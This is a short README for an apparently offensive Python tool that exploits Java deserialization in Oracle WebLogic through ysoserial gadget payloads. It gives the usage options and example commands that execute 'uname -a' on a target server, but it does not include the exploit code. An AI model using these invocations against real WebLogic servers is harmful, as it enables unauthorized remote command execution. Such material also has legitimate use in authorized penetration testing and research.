# JavaUnserializeWeblogic v1.0

Coded By Joel Noguera - @niemand_sec
- Based on https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/weblogic.py

- Payload are being generated using https://github.com/frohoff/ysoserial


# Usage

```
usage: webloic.py [-h] [-ly] [-lp] [-p PAYLOAD] [-pt PAYLOAD_TYPE] [-H HOST]
                  [-P PORT] [-LH LOCAL_HOST] [-LP LOCAL_PORT]

OPTIONS:
  -h, --help            show this help message and exit
  -ly, --list_ysoserial
                        List available ysoserial payload types
  -lp, --list_payloads  List available exploit payloads
  -p PAYLOAD, --payload PAYLOAD
                        Set custom payload to execute on server
  -pt PAYLOAD_TYPE, --payload_type PAYLOAD_TYPE
                        Set ysoserial payload type
  -H HOST, --host HOST  IP from the HOST
  -P PORT, --port PORT  Port where WebLogic is listening
  -LH LOCAL_HOST, --local_host LOCAL_HOST
                        IP from the HOST
  -LP LOCAL_PORT, --local_port LOCAL_PORT
                        Port where WebLogic is listening

Example: python webloic.py-H 127.0.0.1 -P 7001 -p 'uname -a' -pt
CommonsCollections1 python webloic.py-H 127.0.0.1 -P 7001 -p 4
```

# Requirements

Drop your ysoserial version in the same folder and modify the file name (if different) in the `line 161`

# Todo:
- Add dynamic link to ysoserial
- Add dynamic payload TLS support (--ssl option, should be simple)
- Add support to older versions 10.6.3 (test if supported first)
